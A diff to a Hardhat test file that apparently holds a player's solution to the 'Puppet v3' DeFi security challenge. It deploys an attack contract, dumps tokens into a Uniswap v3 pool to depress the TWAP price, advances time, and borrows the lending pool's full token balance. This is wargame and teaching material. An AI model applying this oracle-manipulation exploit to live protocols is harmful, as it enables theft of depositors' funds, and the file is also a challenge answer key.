@@ -140,35 +140,38 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const printPastTime = async () => {
+            console.log({timestamp: (await ethers.provider.getBlock('latest')).timestamp - initialBlockTimestamp})
+        }
+
+        await printPastTime();
         hackPuppetv3 = await (await ethers.getContractFactory('HackPuppetV3', deployer)).deploy(
             weth.address,
             token.address,
             uniswapPool.address,
-            uniswapPositionManager.address
+            lendingPool.address
         );
-        const printBalances = async () => {
-            console.log("player weth", String(await weth.balanceOf(player.address)).slice(0, -18));
-            console.log("player token", String(await token.balanceOf(player.address)).slice(0, -18));
-            console.log("player eth", String(await ethers.provider.getBalance(player.address)).slice(0, -18));
-            console.log("contract weth", String(await weth.balanceOf(hackPuppetv3.address)).slice(0, -18));
-            console.log("contract token", String(await token.balanceOf(hackPuppetv3.address)).slice(0, -18));
-            console.log("contract eth", String(await ethers.provider.getBalance(hackPuppetv3.address)).slice(0, -18));
-            console.log("uniswap weth", String(await weth.balanceOf(uniswapPool.address)).slice(0, -18));
-            console.log("uniswap token", String(await token.balanceOf(uniswapPool.address)).slice(0, -18));
-            console.log("uniswap eth", String(await ethers.provider.getBalance(uniswapPool.address)).slice(0, -18));
-            console.log("-");
-        }
-        
-        await printBalances();
 
-        await weth.connect(player).deposit({value: ethers.utils.parseEther("0.1")});
-        await weth.connect(player).transfer(hackPuppetv3.address, weth.balanceOf(player.address));
-        await player.sendTransaction({to: hackPuppetv3.address, value: ethers.utils.parseEther("0.1"), gasLimit: 30000})
-        await token.connect(player).transfer(hackPuppetv3.address, 1n * 10n ** 18n);
-        await printBalances();
-        await time.increase(3 * 24 * 60 * 60); // 3 days in seconds
-        await hackPuppetv3.connect(player).swap(1n * 10n ** 18n, 30000, encodePriceSqrt(1, 1));
-        await printBalances();
+        await printPastTime();
+        await token.connect(player).transfer(hackPuppetv3.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        
+        await printPastTime();
+        await hackPuppetv3.connect(player).swap(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            encodePriceSqrt(1, LENDING_POOL_INITIAL_TOKEN_BALANCE)
+        );
+ 
+        await printPastTime();
+        await time.increase(111);
+        console.log({required: String(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)).slice(0, -18)});
+        console.log({balance: String(await weth.balanceOf(hackPuppetv3.address)).slice(0, -18)})
+        
+        await printPastTime();
+        await hackPuppetv3.connect(player).borrowAndTransfer(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+       
+
+        await printPastTime();
+
     });
 
     after(async function () {
